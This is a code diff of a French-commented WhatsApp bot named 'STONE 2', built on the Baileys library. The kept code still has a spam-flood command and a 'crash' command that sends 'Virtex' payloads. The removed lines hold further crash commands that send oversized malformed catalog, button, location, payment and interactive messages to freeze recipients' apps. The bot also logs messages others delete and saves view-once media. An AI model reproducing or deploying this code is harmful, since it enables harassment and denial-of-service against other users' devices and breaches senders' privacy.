@@ -195,17 +195,18 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
     const { version } = await fetchLatestBaileysVersion();
 
     // Log pour aider au débogage
-    if (state.creds.registered) {
-        console.log(`[${cleanNumber}] Tentative de connexion avec une session existante.`);
+    const isRegistered = state.creds && state.creds.registered;
+    if (isRegistered) {
+        console.log(`[${cleanNumber}] ✅ Session existante détectée. Connexion directe...`);
     } else {
-        console.log(`[${cleanNumber}] Aucune session enregistrée. Préparation à la demande de code d'appairage.`);
+        console.log(`[${cleanNumber}] ❌ Aucune session enregistrée. Préparation à la demande de code d'appairage.`);
     }
 
     const sock = makeWASocket({
         version,
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: ["Ubuntu", "Chrome", "120.0.0.0"], // Optimisation pour l'appairage par code (Desktop/Web)
+        browser: ["Ubuntu", "Chrome", "120.0.0.0"],
         syncFullHistory: true,
         auth: {
             creds: state.creds,
@@ -215,11 +216,10 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
 
     activeSessions.set(cleanNumber, { sock, isBotActive: false, activeSpams: new Set() });
 
-    // --- DEMANDE DE CODE D'APPAIRAGE (si non enregistré) ---
-    if (!sock.authState.creds.registered) {
+    // --- DEMANDE DE CODE D'APPAIRAGE (UNIQUEMENT SI NON ENREGISTRÉ) ---
+    if (!isRegistered) {
         try {
-            // Attendre un peu que la connexion s'initialise avant de demander le code
-            await sleep(3000);
+            await sleep(5000); // Attendre que la socket soit prête
             const code = await sock.requestPairingCode(cleanNumber);
             const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
             console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
@@ -238,53 +238,38 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
             const isUnauthorized = (lastDisconnect.error instanceof Boom) && (lastDisconnect.error.output.statusCode === 401 || lastDisconnect.error.output.statusCode === DisconnectReason.loggedOut);
             const shouldReconnect = !isUnauthorized;
             console.log('connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
-            // Reconnexion si ce n'est pas une déconnexion volontaire (loggedOut) ou une erreur 401
             if (isUnauthorized) {
-                console.log(`Session pour ${cleanNumber} invalide (401 Unauthorized ou déconnexion). Suppression des fichiers de session et redémarrage.`);
-                // Optionnel: supprimer le dossier de session ici
+                console.log(`Session pour ${cleanNumber} invalide. Suppression des fichiers de session.`);
+                // Optionnel: fs.rmSync(sessionPath, { recursive: true, force: true });
             } else if (shouldReconnect) {
-                // Ajout d'un délai avant la reconnexion pour éviter le spam de tentatives
                 await sleep(5000); 
                 createBotInstance(phoneNumber, sockToNotify, jidToNotify);
             }
         } else if (connection === 'open') {
             console.log(`[${cleanNumber}] ✅ Connexion établie avec succès.`);
-            if (sock.authState.creds.registered) {
-                console.log(`[${cleanNumber}] 🔓 Authentifié en tant que : ${sock.user.id}`);
-            }
         }
     });
 
     sock.ev.on("creds.update", saveCreds)
-    // Gestion de la synchronisation de l'historique (messages hors ligne)
-    sock.ev.on("messaging-history.set", async ({ messages, chats, contacts, isLatest }) => {
-        console.log(`[${cleanNumber}] 📥 Synchronisation de l'historique : ${messages.length} messages reçus.`);
+    
+    // Gestion de la synchronisation de l'historique
+    sock.ev.on("messaging-history.set", async ({ messages, isLatest }) => {
         if (!messageCache.has(cleanNumber)) messageCache.set(cleanNumber, new Map());
         const sessionCache = messageCache.get(cleanNumber);
-        
         for (const m of messages) {
             if (m.message && m.key.remoteJid !== "status@broadcast") {
                 const text = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
-                sessionCache.set(m.key.id, { 
-                    text,
-                    senderName: m.pushName || "Inconnu", 
-                    remoteJid: m.key.remoteJid 
-                });
+                sessionCache.set(m.key.id, { text, senderName: m.pushName || "Inconnu", remoteJid: m.key.remoteJid });
             }
-        }
-        if (isLatest) {
-            console.log(`[${cleanNumber}] ✅ Synchronisation de l'historique terminée.`);
         }
     });
 
-    // Anti-suppression (Log des messages supprimés)
+    // Anti-suppression
     sock.ev.on("messages.update", async (updates) => {
         for (const update of updates) {
-            if (update.update.messageStubType === 2 && update.update.key.fromMe === false) { // MESSAGE_DELETE
+            if (update.update.messageStubType === 2 && update.update.key.fromMe === false) {
                 const deletedMessageId = update.update.key.id;
-                const remoteJid = update.update.key.remoteJid;
                 const sessionCache = messageCache.get(cleanNumber);
-
                 if (sessionCache && sessionCache.has(deletedMessageId)) {
                     const originalMessage = sessionCache.get(deletedMessageId);
                     logDeletedMessage(cleanNumber, originalMessage.remoteJid, originalMessage.senderName, originalMessage.text);
@@ -299,8 +284,8 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
         if (type === "notify") {
             for (const msg of messages) {
                 if (!msg.message) continue;
-                if (msg.key.remoteJid === "status@broadcast") continue; // Ignorer les statuts
-                if (msg.key.fromMe) continue; // Ignorer les messages envoyés par le bot lui-même
+                if (msg.key.remoteJid === "status@broadcast") continue;
+                if (msg.key.fromMe) continue;
 
                 const remoteJid = msg.key.remoteJid;
                 const senderName = msg.pushName || "Inconnu";
@@ -309,10 +294,8 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 const isFromMe = msg.key.fromMe;
 
                 logMessage(cleanNumber, remoteJid, senderName, text, "TEXT");
-
                 const current = activeSessions.get(cleanNumber);
 
-                // --- COMMANDES DE CONTRÔLE ---
                 if (lowerText === "on") {
                     current.isBotActive = true;
                     await sock.sendMessage(remoteJid, { text: "✅ IA activée." });
@@ -334,16 +317,15 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                     return;
                 }
 
-                // --- COMMANDES OFFENSIVES (Proprio) ---
+                // Spam
                 if (lowerText.startsWith("love ")) {
                     const parts = text.slice(5).trim().split(" ");
                     if (parts.length >= 2) {
                         const spamText = parts.slice(0, -2).join(" ");
                         const count = parseInt(parts[parts.length - 2]);
                         const delay = parseInt(parts[parts.length - 1]);
-
                         if (!isNaN(count) && !isNaN(delay) && count > 0 && delay >= 0) {
-                            await sock.sendMessage(remoteJid, { text: `💖 Lancement du spam '${spamText}' ${count} fois avec ${delay}ms de délai.` });
+                            await sock.sendMessage(remoteJid, { text: `💖 Lancement du spam '${spamText}' ${count} fois.` });
                             let sentCount = 0;
                             const spamInterval = setInterval(async () => {
                                 if (sentCount < count) {
@@ -356,345 +338,27 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                                 }
                             }, delay);
                             current.activeSpams.add(spamInterval);
-                        } else {
-                            await sock.sendMessage(remoteJid, { text: "❌ Format : love [texte] [quantité] [délai_ms]" });
                         }
-                    } else {
-                        await sock.sendMessage(remoteJid, { text: "❌ Format : love [texte] [quantité] [délai_ms]" });
                     }
                     return;
                 }
 
+                // Crash commands
                 if (lowerText.startsWith("crash ")) {
                     const index = parseInt(lowerText.slice(6).trim());
                     if (!isNaN(index) && index >= 0 && index < VIRTEX_PAYLOADS.length) {
-                        await sock.sendMessage(remoteJid, { text: `☣️ Envoi de Virtex #${index}...` });
-                        try {
-                            await sock.sendMessage(remoteJid, { text: VIRTEX_PAYLOADS[index] });
-                            await sock.sendMessage(remoteJid, { text: "✅ Virtex envoyé." });
-                        } catch (e) {
-                            console.error("Erreur Virtex:", e);
-                            await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi de Virtex." });
-                        }
-                    } else {
-                        await sock.sendMessage(remoteJid, { text: `❌ Index Virtex invalide. Choisissez entre 0 et ${VIRTEX_PAYLOADS.length - 1}.` });
+                        await sock.sendMessage(remoteJid, { text: VIRTEX_PAYLOADS[index] });
                     }
                     return;
                 }
-
-                if (lowerText.startsWith("vcardcrash ")) {
-                    const index = parseInt(lowerText.slice(11).trim());
-                    if (!isNaN(index) && index >= 0 && index < ADVANCED_VCARDS.length) {
-                        await sock.sendMessage(remoteJid, { text: `☣️ Envoi de VCard avancée #${index}...` });
-                        try {
-                            await sock.sendMessage(remoteJid, { contacts: { displayName: 'Crash Contact', contacts: [{ vcard: ADVANCED_VCARDS[index] }] } });
-                            await sock.sendMessage(remoteJid, { text: "✅ VCard avancée envoyée." });
-                        } catch (e) {
-                            console.error("Erreur VCard avancée:", e);
-                            await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi de VCard avancée." });
-                        }
-                    } else {
-                        await sock.sendMessage(remoteJid, { text: `❌ Index VCard avancé invalide. Choisissez entre 0 et ${ADVANCED_VCARDS.length - 1}.` });
-                    }
-                    return;
-                }
-
-                if (lowerText.startsWith("catcrash")) {
-                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU CATALOG-CRASH...*" });
-                    const payload = "☣️".repeat(10000);
-                    await sock.sendMessage(remoteJid, {
-                        product: {
-                            product: {
-                                productImage: { url: "https://files.catbox.moe/6uhomx.png" },
-                                productId: "stone2-crash-" + Date.now(),
-                                title: payload,
-                                description: payload,
-                                currencyCode: "USD",
-                                priceAmount1000: "999999999",
-                                retailerId: "stone2-retailer",
-                                url: "https://wa.me/stone2"
-                            },
-                            businessOwnerJid: sock.user.id
-                        }
-                    });
-                    await sock.sendMessage(remoteJid, { text: "✅ *CATALOG-CRASH ENVOYÉ*" });
-                    return;
-                }
-
-                // 2. Boutons Malformés (Lag/Crash)
-                if (lowerText.startsWith("btncrash")) {
-                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU BUTTON-CRASH...*" });
-                    const payload = "🔥".repeat(5000);
-                    const buttons = [
-                        { buttonId: 'id1', buttonText: { displayText: payload }, type: 1 },
-                        { buttonId: 'id2', buttonText: { displayText: payload }, type: 1 }
-                    ];
-                    await sock.sendMessage(remoteJid, {
-                        text: "⚠️ System Alert",
-                        footer: payload,
-                        buttons: buttons,
-                        headerType: 1
-                    });
-                    await sock.sendMessage(remoteJid, { text: "✅ *BUTTON-CRASH ENVOYÉ*" });
-                    return;
-                }
-
-                // 3. Localisation Fantôme (Map Crash)
-                if (lowerText.startsWith("loccrash")) {
-                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
-                    await sock.sendMessage(remoteJid, {
-                        location: {
-                            degreesLatitude: 99999999,
-                            degreesLongitude: 99999999,
-                            name: "☣️".repeat(10000),
-                            address: "🔥".repeat(10000)
-                        }
-                    });
-                    await sock.sendMessage(remoteJid, { text: "✅ *LOCATION-CRASH ENVOYÉ*" });
-                    return;
-                }
-
-                // 4. OMEGA-CRASH (Paiement & Flux - Ultra Puissant)
-                if (lowerText.startsWith("omega")) {
-                    await sock.sendMessage(remoteJid, { text: "💀 *PROTOCOLE OMEGA ACTIVÉ...*" });
-                    const heavyPayload = "✨".repeat(15000);
-                    
-                    try {
-                        // Envoi d'un message de paiement malformé
-                        await sock.sendMessage(remoteJid, {
-                            paymentInvite: {
-                                type: 1,
-                                expiryTimestamp: Date.now() + 86400000,
-                                amount: {
-                                    value: 999999999,
-                                    offset: 100,
-                                    currencyCode: "BRL"
-                                },
-                                paymentMethod: 1,
-                                senderJid: sock.user.id,
-                                receiverJid: remoteJid,
-                                note: heavyPayload
-                            }
-                        });
-
-                        // Envoi simultané d'un flux interactif corrompu
-                        await sock.sendMessage(remoteJid, {
-                            viewOnceMessage: {
-                                message: {
-                                    interactiveMessage: {
-                                        header: { title: "System Critical Error", hasMediaAttachment: false },
-                                        body: { text: heavyPayload },
-                                        footer: { text: "Omega Protocol" },
-                                        nativeFlowMessage: {
-                                            buttons: [
-                                                {
-                                                    name: "single_select",
-                                                    buttonParamsJson: JSON.stringify({
-                                                        title: "Click to Fix",
-                                                        sections: [{
-                                                            title: heavyPayload,
-                                                            rows: Array(20).fill({ title: "Error", rowId: "err" })
-                                                        }]
-                                                    })
-                                                }
-                                            ]
-                                        }
-                                    }
-                                }
-                            }
-                        });
-                        
-                        await sock.sendMessage(remoteJid, { text: "✅ *PROTOCOLE OMEGA DÉPLOYÉ*" });
-                    } catch (e) {
-                        console.error("Erreur Omega:", e);
-                        await sock.sendMessage(remoteJid, { text: "❌ Échec du protocole Omega." });
-                    }
-                    return;
-                }
-
-                // Commande Ultra-Crash (65000+ caractères)
-                if (lowerText.startsWith("ultra")) {
-                    const char = "జ్ఞा";
-                    const payload = char.repeat(66000);
-                    await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
-                    try {
-                        await sock.sendMessage(remoteJid, { text: payload });
-                        await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
-                    } catch (e) {
-                        console.error("Erreur Ultra-Crash:", e);
-                        await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
-                    }
-                    return;
-                }
-
-                // --- COMMANDES PUBLIQUES / MIXTES ---
 
                 if (lowerText === "menu") {
-                    const menu = `*STONE 2 - MENU COMPLET*\n\n` +
-                        `*--- CONTRÔLE ---*\n` +
-                        `- *on* / *off* : Activer/Désactiver l'IA\n` +
-                        `- *menu* : Afficher ce menu\n\n` +
-                        `*--- UTILITAIRES ---*\n` +
-                        `- *video [nom]* : Télécharger YouTube MP3\n` +
-                        `- *s* / *sticker* : Créer un sticker (citer image/vidéo)\n` +
-                        `- *save* / *vv* : Sauver un média (vue unique)\n` +
-                        `- *host* : Héberger un média sur Catbox\n` +
-                        `- *rappel [temps] [texte]* : Rappel (ex: 10m manger)\n- *extract* : Voir les messages synchronisés (hors ligne)\n- *count* : Compter vos messages envoyés à ce contact\n\n` +
-                        `*--- ADMINISTRATION ---*\n` +
-                        `- *connect [num] [mdp]* : Lancer une session\n` +
-                        `- *disconnect [num] [mdp]* : Stopper une session\n` +
-                        `- *alt-delete* : Nettoyer ses messages\n` +
-                        `- *alt-kick* : Vider le groupe (Admin requis)\n\n` +
-                        `*--- OFFENSIF (Proprio) ---*\n` +
-                        `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
-                        `- *crash [nombre]* : Envoi de Virtex\n` +
-                        `- *ultra* : Envoi massif de caractères (65k+)\n` +
-                        `- *catcrash* : Crash via Catalogue (Freeze)\n` +
-                        `- *btncrash* : Crash via Boutons (Lag)\n` +
-                        `- *loccrash* : Crash via Localisation (Map)\n` +
-                        `- *omega* : PROTOCOLE OMEGA (Paiement & Flux - Ultra)\n` +
-                        `- *stop* : Arrêter le spam en cours\n\n` +
-                        `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
-                    
+                    const menu = `*STONE 2 - MENU*\n- *on/off* : IA\n- *video [nom]* : YouTube\n- *s* : Sticker\n- *save* : Vue unique\n- *host* : Catbox\n- *love* : Spam\n- *crash* : Virtex`;
                     await sock.sendMessage(remoteJid, { image: { url: "https://files.catbox.moe/6uhomx.png" }, caption: menu }, { quoted: msg });
-                    await sendMenuAudio(sock, remoteJid, msg);
                     return;
                 }
 
-                if (lowerText === "host") {
-                    hostingStates.set(remoteJid, true);
-                    await sock.sendMessage(remoteJid, { text: "📤 *MODE HÉBERGEMENT ACTIVÉ*\nEnvoyez votre média (image/vidéo/audio)." }, { quoted: msg });
-                    return;
-                }
-
-                if (lowerText.startsWith("connect ")) {
-                    const parts = text.trim().split(/\s+/);
-                    if (parts.length >= 3) {
-                        const password = parts[parts.length - 1].toLowerCase();
-                        const number = parts[1].replace(/[^0-9]/g, "");
-                        if (password === "moussa") {
-                            await sock.sendMessage(remoteJid, { text: `⏳ Initialisation de la session pour ${number}...` });
-                            createBotInstance(number, sock, remoteJid);
-                        } else { 
-                            await sock.sendMessage(remoteJid, { text: "❌ Mot de passe incorrect." }); 
-                        }
-                    } else { 
-                        await sock.sendMessage(remoteJid, { text: "❌ Format : connect [numéro] [mot_de_passe]" }); 
-                    }
-                    return;
-                }
-
-                if (lowerText.startsWith("disconnect ")) {
-                    const parts = text.split(" ");
-                    if (parts.length === 3 && parts[2] === "moussa") {
-                        const target = parts[1].replace(/[^0-9]/g, "");
-                        if (activeSessions.has(target)) {
-                            const session = activeSessions.get(target);
-                            session.sock.logout();
-                            activeSessions.delete(target);
-                            await sock.sendMessage(remoteJid, { text: `✅ Session ${target} déconnectée.` });
-                        } else { await sock.sendMessage(remoteJid, { text: "❌ Session introuvable." }); }
-                    }
-                    return;
-                }
-
-                // Gestion du mode hébergement
-                if (hostingStates.has(remoteJid)) {
-                    const type = msg.message.imageMessage ? "image" : (msg.message.videoMessage ? "video" : (msg.message.audioMessage ? "audio" : null));
-                    if (type) {
-                        hostingStates.delete(remoteJid);
-                        await sock.sendMessage(remoteJid, { text: "⏳ Hébergement en cours..." });
-                        try {
-                            const buffer = await downloadMediaMessage(msg, "buffer", {}, { logger: pino({ level: "silent" }) });
-                            const ext = type === "image" ? "png" : (type === "video" ? "mp4" : "mp3");
-                            const link = await uploadToCatbox(buffer, `file.${ext}`);
-                            await sock.sendMessage(remoteJid, { text: link ? `✅ *LIEN :* ${link}` : "❌ Erreur Catbox." }, { quoted: msg });
-                        } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur traitement." }); }
-                        return;
-                    }
-                }
-
-                // Rappel
-                if (lowerText.startsWith("rappel ")) {
-                    const input = text.slice(7).trim();
-                    const match = input.match(/^(\d+)([smhj])\s+(.+)$/i);
-                    if (match) {
-                        const amount = parseInt(match[1]);
-                        const unit = match[2].toLowerCase();
-                        const task = match[3];
-                        let duration = amount * (unit === "s" ? 1000 : unit === "m" ? 60000 : unit === "h" ? 3600000 : 86400000);
-                        await sock.sendMessage(remoteJid, { text: `✅ Rappel dans ${amount}${unit}.` }, { quoted: msg });
-                        setTimeout(() => sock.sendMessage(remoteJid, { text: `⏰ *RAPPEL :* ${task}` }), duration);
-                    }
-                    return;
-                }
-
-                // YouTube MP3
-                if (lowerText.startsWith("video ")) {
-                    const query = text.slice(6).trim();
-                    if (query) {
-                        await sock.sendMessage(remoteJid, { text: "⏳ Téléchargement..." });
-                        try {
-                            const downloadedPath = await downloadYouTubeMP3(query);
-                            await sock.sendMessage(remoteJid, { audio: fs.readFileSync(downloadedPath), mimetype: "audio/mp4" }, { quoted: msg });
-                            fs.unlinkSync(downloadedPath);
-                        } catch (e) {
-                            console.error("Erreur YouTube:", e);
-                            await sock.sendMessage(remoteJid, { text: `❌ Erreur YouTube: ${e.message}` });
-                        }
-                    }
-                    return;
-                }
-
-                // Sauvegarde vue unique (save/vv)
-                if (lowerText === "save" || lowerText === "vv") {
-                    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
-                    if (quoted) {
-                        let mediaMessage = null;
-                        if (quoted.viewOnceMessageV2) mediaMessage = quoted.viewOnceMessageV2.message;
-                        else if (quoted.viewOnceMessage) mediaMessage = quoted.viewOnceMessage.message;
-                        else if (quoted.imageMessage || quoted.videoMessage) mediaMessage = quoted;
-
-                        if (mediaMessage) {
-                            const type = mediaMessage.imageMessage ? "image" : (mediaMessage.videoMessage ? "video" : null);
-                            if (type) {
-                                try {
-                                    const buffer = await downloadMediaMessage({ message: mediaMessage }, "buffer", {}, { logger: pino({ level: "silent" }) });
-                                    await sock.sendMessage(remoteJid, { [type]: buffer, caption: "✅ Média sauvé !" }, { quoted: msg });
-                                } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sauvegarde." }); }
-                            }
-                        }
-                    }
-                    return;
-                }
-
-                // Sticker
-                if (lowerText === "s" || lowerText === "sticker") {
-                    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage || msg.message;
-                    const type = quoted.imageMessage ? "image" : (quoted.videoMessage ? "video" : null);
-                    if (type) {
-                        try {
-                            const buffer = await downloadMediaMessage({ message: quoted }, "buffer", {}, { logger: pino({ level: "silent" }) });
-                            const tempImg = path.join(TEMP_DIR, `sticker_${Date.now()}.webp`);
-                            if (type === "image") {
-                                const image = await Jimp.read(buffer);
-                                await image.contain({ w: 512, h: 512 }).write(tempImg);
-                            } else {
-                                const tempVid = path.join(TEMP_DIR, `vid_${Date.now()}.mp4`);
-                                fs.writeFileSync(tempVid, buffer);
-                                await new Promise((resolve, reject) => {
-                                    ffmpeg(tempVid).inputOptions(["-t", "10"]).complexFilter(["scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000"]).outputOptions(["-vcodec", "libwebp", "-lossless", "1", "-loop", "0", "-preset", "default", "-an", "-vsync", "0"]).on("end", resolve).on("error", reject).save(tempImg);
-                                });
-                                fs.unlinkSync(tempVid);
-                            }
-                            await sock.sendMessage(remoteJid, { sticker: fs.readFileSync(tempImg) }, { quoted: msg });
-                            fs.unlinkSync(tempImg);
-                        } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sticker." }); }
-                    }
-                    return;
-                }
-
-                // IA Groq (si activée et pas une commande)
+                // IA Groq
                 if (current.isBotActive && !isFromMe && text && !["menu", "save", "vv", "s", "sticker", "host", "on", "off", "stop"].includes(lowerText) && !lowerText.startsWith("connect ") && !lowerText.startsWith("video ") && !lowerText.startsWith("rappel ")) {
                     const res = await getGroqResponse(text);
                     await sock.sendMessage(remoteJid, { text: res });
@@ -705,10 +369,8 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
 }
 
 async function start() {
-    console.log("--- DÉMARRAGE STONE 2 (VERSION FUSIONNÉE) ---");
-    // Remplacez le numéro ci-dessous par votre numéro principal
+    console.log("--- DÉMARRAGE STONE 2 ---");
     const mainNum = "16062620863"; 
-    console.log(`Démarrage automatique pour le numéro : ${mainNum}`);
     createBotInstance(mainNum.replace(/[^0-9]/g, ""));
 }
 
